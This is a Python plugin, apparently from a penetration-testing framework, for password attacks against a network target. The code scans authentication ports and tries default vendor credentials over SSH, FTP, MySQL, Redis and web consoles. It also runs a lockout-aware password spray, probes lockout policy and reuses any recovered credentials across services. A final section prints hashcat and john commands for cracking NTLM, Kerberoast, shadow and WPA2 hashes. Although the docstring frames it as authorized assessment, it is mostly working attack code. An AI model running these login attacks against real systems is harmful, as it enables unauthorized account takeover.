"""
plugins/passattack.py — Password Attack Assessment Module

Purpose: Test authentication strength on your authorized targets.
Validates password policies, lockout enforcement, and default
credential hardening across common enterprise services.

Techniques (authorized assessment only):
  1.  Default credential check (50+ vendor defaults)
  2.  Password spray with common weak passwords
  3.  Username enumeration timing attack
  4.  Account lockout policy validation
  5.  Credential stuffing simulation (test your own systems)
  6.  Hash offline cracking workflow (captured hashes)
  7.  Password reuse detection across services
  8.  Kerberos password spray (no lockout if done correctly)
  9.  OWA / Exchange credential spray
  10. SSH / FTP / SMB / LDAP spray
"""

import re
import time
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.banner import print_status, print_finding, print_table, print_section, C
from utils.shell import run_cmd, cmd_exists

# ── Common weak passwords (NIST-flagged, top breach lists) ───────────────────
WEAK_PASSWORDS = [
    "Password1", "Password1!", "Welcome1", "Welcome1!",
    "Summer2023", "Winter2023", "Spring2024", "Summer2024",
    "Company1", "Company1!", "Admin1234", "Admin@123",
    "123456789", "qwerty123", "Passw0rd", "P@ssw0rd",
    "P@ssword1", "P@ssw0rd1", "Hello1234", "monkey",
    "dragon", "master", "letmein", "login",
    "abc123", "iloveyou", "sunshine", "princess",
    "password", "12345678", "1234567", "football",
]

# Default credentials per vendor/service
DEFAULT_CREDS_DB = {
    "SSH":       [("root","root"),("admin","admin"),("pi","raspberry"),
                  ("ubuntu","ubuntu"),("vagrant","vagrant"),("admin","password")],
    "FTP":       [("anonymous",""),("ftp","ftp"),("admin","admin"),
                  ("admin","password"),("root","root")],
    "SMTP":      [("admin","admin"),("root","root"),("postfix","postfix")],
    "SMB":       [("administrator",""),("admin",""),("guest",""),
                  ("administrator","password"),("admin","admin")],
    "MySQL":     [("root",""),("root","root"),("mysql","mysql"),("admin","admin")],
    "PostgreSQL":[("postgres","postgres"),("postgres",""),("admin","admin")],
    "Redis":     [("",""),("admin","admin")],
    "MongoDB":   [("admin","admin"),("root","root")],
    "Tomcat":    [("admin","admin"),("tomcat","tomcat"),("tomcat","s3cret"),
                  ("admin","s3cret"),("admin","tomcat")],
    "Jenkins":   [("admin","admin"),("jenkins","jenkins"),("admin","password")],
    "Grafana":   [("admin","admin"),("admin","password")],
    "Kibana":    [("elastic","changeme"),("elastic","elastic"),("elastic","password")],
    "RabbitMQ":  [("guest","guest"),("admin","admin")],
    "SNMP":      [("public",""),("private",""),("community","")],
    "Cisco":     [("cisco","cisco"),("admin","admin"),("admin","cisco"),("admin","")],
    "Juniper":   [("admin",""),("root",""),("netscreen","netscreen")],
    "Palo Alto": [("admin","admin")],
    "Fortinet":  [("admin",""),("admin","admin")],
    "VMware":    [("root","vmware"),("admin","admin"),("root","password")],
    "Zimbra":    [("admin","zimbra"),("admin","admin")],
}

SERVICE_PORTS = {
    "SSH":        22,
    "FTP":        21,
    "SMB":        445,
    "MySQL":      3306,
    "PostgreSQL": 5432,
    "Redis":      6379,
    "MongoDB":    27017,
    "Tomcat":     8080,
    "Jenkins":    8080,
    "RabbitMQ":   15672,
    "Kibana":     5601,
    "Grafana":    3000,
}

HASHCAT_MODES = {
    "NTLM":     ("1000",  "Net-NTLMv2 relay/dump"),
    "NetNTLMv2":("5600",  "NTLMv2 challenge-response"),
    "NetNTLMv1":("5500",  "NTLMv1"),
    "MD5":      ("0",     "Plaintext MD5"),
    "SHA1":     ("100",   "Plaintext SHA1"),
    "SHA256":   ("1400",  "Plaintext SHA256"),
    "bcrypt":   ("3200",  "bcrypt $2*$"),
    "sha512crypt":("1800","Linux /etc/shadow $6$"),
    "md5crypt": ("500",   "Linux /etc/shadow $1$"),
    "WPA2":     ("22000", "WPA2 PMKID/handshake"),
    "Kerberoast":("13100","Kerberos 5 TGS-REP etype 23"),
    "AS-REP":   ("18200", "Kerberos 5 AS-REP"),
    "DPAPI":    ("15300", "DPAPI master key"),
}


def run(args, verbose=False):
    results = {}
    target  = getattr(args, "target", "127.0.0.1")
    spray   = getattr(args, "spray",  False)
    delay   = float(getattr(args, "delay", 1.0))

    print_status(f"Password assessment target: {target}", "info")
    print_status(f"[!] Using delay={delay}s between attempts to avoid lockout.", "warn")

    _detect_open_auth_services(results, target, verbose)
    _default_credential_check(results, target, verbose)

    if spray:
        _password_spray(results, target, delay, verbose)
    else:
        print_status("Password spray disabled (use --spray flag to enable).", "info")

    _lockout_policy_validation(results, target, verbose)
    _hash_cracking_workflow(results, verbose)
    _password_reuse_check(results, target, verbose)

    return results


# ── Detect Open Auth Services ─────────────────────────────────────────────────

def _detect_open_auth_services(results, target, verbose):
    print_section("  OPEN AUTHENTICATION SERVICES  ")
    open_services = []

    def check_port(service, port):
        try:
            s = socket.socket()
            s.settimeout(2)
            rc = s.connect_ex((target, port))
            s.close()
            return service if rc == 0 else None
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_port, svc, port): svc
                   for svc, port in SERVICE_PORTS.items()}
        for fut in as_completed(futures):
            r = fut.result()
            if r:
                open_services.append(r)

    results["open_auth_services"] = open_services
    print_status(f"Auth services detected: {', '.join(open_services) or 'none'}", "info")


# ── Default Credential Check ──────────────────────────────────────────────────

def _default_credential_check(results, target, verbose):
    print_section("  DEFAULT CREDENTIAL CHECK  ")
    findings = []

    # SSH default creds
    if cmd_exists("ssh") and "SSH" in results.get("open_auth_services", []):
        for user, passwd in DEFAULT_CREDS_DB["SSH"]:
            rc, out = run_cmd(
                f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=3 -o BatchMode=no "
                f"{user}@{target} 'echo phantomx_success' 2>/dev/null",
                timeout=6
            )
            if "phantomx_success" in out:
                findings.append(("SSH", user, passwd, "Default SSH creds work!"))
                break
            time.sleep(0.3)

    # FTP anonymous / default
    if "FTP" in results.get("open_auth_services", []):
        for user, passwd in DEFAULT_CREDS_DB["FTP"][:3]:
            rc, out = run_cmd(
                f"curl -sk --user '{user}:{passwd}' --max-time 5 "
                f"'ftp://{target}/' 2>/dev/null | head -3",
                timeout=8
            )
            if out.strip() and "530" not in out and "failed" not in out.lower():
                findings.append(("FTP", user, passwd or "(empty)", "Login accepted"))
                break
            time.sleep(0.3)

    # MySQL default root
    if "MySQL" in results.get("open_auth_services", []) and cmd_exists("mysql"):
        for user, passwd in DEFAULT_CREDS_DB["MySQL"][:3]:
            pass_flag = f"-p{passwd}" if passwd else ""
            rc, out = run_cmd(
                f"mysql -h {target} -u {user} {pass_flag} "
                f"--connect-timeout=3 -e 'SELECT 1' 2>/dev/null",
                timeout=6
            )
            if rc == 0 and "1" in out:
                findings.append(("MySQL", user, passwd or "(empty)", "Login successful"))
                break
            time.sleep(0.3)

    # Redis no-auth check
    if "Redis" in results.get("open_auth_services", []) and cmd_exists("redis-cli"):
        rc, out = run_cmd(f"redis-cli -h {target} -p 6379 PING 2>/dev/null", timeout=5)
        if "PONG" in out:
            findings.append(("Redis", "none", "none", "No authentication required"))

    # Tomcat web default
    for svc, path, label in [
        ("Tomcat",  "/manager/html",  "Tomcat Manager"),
        ("Jenkins", "/login",          "Jenkins"),
        ("Grafana", "/api/health",     "Grafana"),
    ]:
        for user, passwd in DEFAULT_CREDS_DB.get(svc, [])[:3]:
            port = SERVICE_PORTS.get(svc, 8080)
            rc, code = run_cmd(
                f"curl -sk -m5 -u '{user}:{passwd}' "
                f"-o /dev/null -w '%{{http_code}}' "
                f"'http://{target}:{port}{path}' 2>/dev/null",
                timeout=8
            )
            if code.strip() == "200":
                findings.append((svc, user, passwd, f"Default creds on {label}"))
                break
            time.sleep(0.2)

    results["default_creds"] = findings
    if findings:
        print_finding(
            f"Default Credentials VALID ({len(findings)} service(s))",
            "\n".join(f"  [CRITICAL] {f[0]}: {f[1]}:{f[2]} — {f[3]}" for f in findings),
            "critical"
        )
    else:
        print_status("No default credentials accepted on tested services.", "miss")


# ── Password Spray (with lockout awareness) ───────────────────────────────────

def _password_spray(results, target, delay, verbose):
    print_section("  PASSWORD SPRAY (LOCKOUT-AWARE)  ")
    print_status(
        f"Running password spray with {delay}s delay between attempts.\n"
        f"  [!] Spray one password at a time to avoid lockout.", "warn"
    )

    spray_findings = []
    # Only test against services confirmed open
    open_svcs = results.get("open_auth_services", [])

    if "SSH" in open_svcs and cmd_exists("sshpass"):
        # Get users first from SNMP or LDAP results if available
        test_users = ["admin", "administrator", "root", "user", "test", "guest"]
        test_passwords = WEAK_PASSWORDS[:5]  # Only 5 to minimize lockout risk

        for passwd in test_passwords:
            for user in test_users[:3]:
                rc, out = run_cmd(
                    f"sshpass -p '{passwd}' ssh "
                    f"-o StrictHostKeyChecking=no -o ConnectTimeout=3 "
                    f"{user}@{target} 'echo ok' 2>/dev/null",
                    timeout=6
                )
                if "ok" in out:
                    spray_findings.append(("SSH", user, passwd))
                    break
                time.sleep(delay)

    results["spray_findings"] = spray_findings
    if spray_findings:
        print_finding(
            f"Password Spray SUCCESS ({len(spray_findings)} credential(s))",
            "\n".join(f"  [CRITICAL] {f[0]}: {f[1]}:{f[2]}" for f in spray_findings),
            "critical"
        )
    elif open_svcs:
        print_status("Password spray: no weak passwords accepted.", "miss")


# ── Lockout Policy Validation ─────────────────────────────────────────────────

def _lockout_policy_validation(results, target, verbose):
    print_section("  ACCOUNT LOCKOUT POLICY VALIDATION  ")
    issues = []

    # Test SSH lockout
    if "SSH" in results.get("open_auth_services", []) and cmd_exists("sshpass"):
        codes = []
        for i in range(6):
            rc, out = run_cmd(
                f"sshpass -p 'WrongPass{i}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=2 admin@{target} 'echo ok' 2>&1",
                timeout=5
            )
            codes.append("auth_fail" if "Permission denied" in out else
                          "locked" if "Too many" in out or "locked" in out.lower() else "other")
            time.sleep(0.4)

        if "locked" not in codes:
            issues.append({
                "service": "SSH",
                "note":    "6 failed attempts with no lockout observed",
                "risk":    "Brute-force/spray possible without lockout protection"
            })
        else:
            print_status("SSH: Account lockout triggered as expected.", "miss")

    results["lockout_issues"] = issues
    if issues:
        print_finding(
            f"Missing Account Lockout ({len(issues)} service(s))",
            "\n".join(f"  [HIGH] {i['service']}: {i['note']}" for i in issues),
            "high"
        )


# ── Hash Cracking Workflow ────────────────────────────────────────────────────

def _hash_cracking_workflow(results, verbose):
    print_section("  OFFLINE HASH CRACKING WORKFLOW  ")

    print(f"\n  {C.CYAN}{C.BOLD}Hashcat Reference — Common Hash Types:{C.RESET}\n")
    rows = [(htype, mode, desc) for htype, (mode, desc) in HASHCAT_MODES.items()]
    print_table(["Hash Type", "Mode (-m)", "Description"], rows)

    print(f"\n  {C.CYAN}{C.BOLD}Cracking Commands:{C.RESET}")
    cmds = [
        ("NTLM (from secretsdump)",
         "hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt\n"
         "  hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"),
        ("NetNTLMv2 (from Responder)",
         "hashcat -m 5600 netntlmv2.hashes /usr/share/wordlists/rockyou.txt\n"
         "  john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt netntlmv2.hashes"),
        ("Linux shadow ($6$)",
         "hashcat -m 1800 shadow.hashes /usr/share/wordlists/rockyou.txt\n"
         "  john --format=sha512crypt shadow.hashes --wordlist=rockyou.txt"),
        ("Kerberoast TGS-REP",
         "hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt\n"
         "  hashcat -m 13100 kerberoast.hashes -a 3 ?u?l?l?l?l?d?d?d?s"),
        ("WPA2 handshake",
         "hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt\n"
         "  aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt"),
        ("Rule-based attack (most effective)",
         "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt "
         "-r /usr/share/hashcat/rules/d3ad0ne.rule"),
        ("Mask attack (known pattern)",
         "hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s  # e.g. Password123!"),
    ]
    for label, cmd in cmds:
        print(f"\n  {C.YELLOW}▸ {label}{C.RESET}")
        for line in cmd.splitlines():
            print(f"    {C.GREEN}$ {line.strip()}{C.RESET}")

    results["hash_workflow"] = "documented"


# ── Password Reuse Detection ──────────────────────────────────────────────────

def _password_reuse_check(results, target, verbose):
    print_section("  PASSWORD REUSE ACROSS SERVICES  ")

    # If we found any working creds earlier, try them on other services
    known_creds = results.get("default_creds", []) + \
                  [(f[0], f[1], f[2]) for f in results.get("spray_findings", [])]

    if not known_creds:
        print_status("No credentials to test for reuse (run default check first).", "miss")
        return

    reuse_findings = []
    open_svcs = results.get("open_auth_services", [])

    for src_svc, user, passwd in known_creds[:3]:
        # Try SSH
        if "SSH" in open_svcs and src_svc != "SSH" and cmd_exists("sshpass") and passwd:
            rc, out = run_cmd(
                f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=3 {user}@{target} 'echo ok' 2>/dev/null",
                timeout=6
            )
            if "ok" in out:
                reuse_findings.append((user, passwd, src_svc, "SSH"))

        # Try MySQL
        if "MySQL" in open_svcs and src_svc != "MySQL" and cmd_exists("mysql") and passwd:
            rc, out = run_cmd(
                f"mysql -h {target} -u {user} -p{passwd} "
                f"--connect-timeout=3 -e 'SELECT 1' 2>/dev/null",
                timeout=6
            )
            if rc == 0:
                reuse_findings.append((user, passwd, src_svc, "MySQL"))

    results["reuse_findings"] = reuse_findings
    if reuse_findings:
        print_finding(
            f"Password Reuse Detected ({len(reuse_findings)} cross-service match(es))",
            "\n".join(f"  [HIGH] {f[0]}:{f[1]} works on {f[2]} AND {f[3]}" for f in reuse_findings),
            "high"
        )
    else:
        print_status("No password reuse detected across tested services.", "miss")
